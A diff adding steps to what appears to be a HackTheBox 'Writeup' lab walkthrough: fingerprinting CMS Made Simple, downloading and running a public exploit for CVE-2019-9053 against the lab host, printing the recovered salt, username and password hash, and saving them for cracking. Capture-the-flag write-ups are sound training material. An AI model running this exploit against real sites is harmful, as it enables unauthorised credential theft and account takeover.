@@ -61,6 +61,37 @@
 
     $ wappalyzer http://10.10.10.138/writeup/ | jq
     
-// 
+// found cms !
+
+    cms made simple
     
+// Search exploit db cms made simple 2019    
+
+// found python exploit for CVE:2019-9053, lets try him
+
+![Image 4](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/WriteUp/4.png)
+
+// Download the explot
+
+    $ wget https://www.exploit-db.com/download/46635
+
+// Run the exploit (work ONLY with python2)
+
+    $ python 46635 -u http://10.10.10.138/writeup/
+-----
+
+    [+] Salt for password found: 5a599ef579066807
+    [+] Username found: jkr
+    [+] Email found: jkr@writeup.htb
+    [+] Password found: 62def4866937f08cc13bab43bb14e6f7
+
+
+// somehow i have decrypted the hash woithout the salt in ![here](https://hashtoolkit.com/generate-hash/?text=salt)
+
+![Image 5](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/WriteUp/5.png)
+
+// save the salted hash
+
+    $ echo '62def4866937f08cc13bab43bb14e6f7:5a599ef579066807' > hash
+
     
